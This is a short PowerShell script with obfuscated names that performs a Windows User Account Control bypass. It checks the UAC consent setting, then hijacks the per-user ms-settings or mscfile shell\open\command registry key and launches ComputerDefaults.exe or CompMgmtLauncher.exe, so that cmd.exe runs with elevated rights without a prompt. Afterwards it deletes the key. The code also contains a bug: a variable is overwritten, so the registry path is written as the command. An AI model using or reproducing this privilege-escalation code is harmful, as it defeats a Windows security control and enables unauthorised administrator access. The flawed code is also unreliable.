function gXJqIeQLEx{
	[CmdletBinding()]
	param([string]$nGZbQUSuHF='cmd.exe')

    $jZdzyknCRV = [System.Environment]::OSVersion.Version.Major

	
	$LSthpEDlPZ = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
	$gzXVjLfAtC = Get-ItemPropertyValue -Path $LSthpEDlPZ -Name ConsentPromptBehaviorAdmin

	function snCAvSgLOW([string]$LSthpEDlPZ, [string]$zcmQEOiKZb, [string]$nGZbQUSuHF='cmd.exe'){
		$nGZbQUSuHF = "HKCU:\Software\Classes\$LSthpEDlPZ\shell\open\command"
		New-Item $nGZbQUSuHF -Force
		New-ItemProperty $nGZbQUSuHF -Name "DelegateExecute" -Value $null -Force
		Set-ItemProperty $nGZbQUSuHF -Name "(default)" -Value $nGZbQUSuHF -Force
		Start-Process $zcmQEOiKZb
		Start-Sleep -s 5
		Remove-Item $nGZbQUSuHF -Force -Recurse
	}

	if ($gzXVjLfAtC -eq 2) {
		$rjCeXGhRVN = 'High'
	} elseif ($gzXVjLfAtC -eq 0) {
		$rjCeXGhRVN = 'None'
	} elseif ($gzXVjLfAtC -eq 5) {
		$rjCeXGhRVN = 'Default'
	} else {
		$rjCeXGhRVN = 'Unknown'
	}

	if ($rjCeXGhRVN -eq "High") {
		exit
	} elseif ($rjCeXGhRVN -eq "None") {
		Start-Process -FilePath $nGZbQUSuHF -verb runas
	} else {
		if ($jZdzyknCRV -eq 10) {
			snCAvSgLOW ms-settings ComputerDefaults.exe $nGZbQUSuHF
		} else {
			snCAvSgLOW mscfile CompMgmtLauncher.exe $nGZbQUSuHF
		}
	}
}
gXJqIeQLEx 'cmd.exe'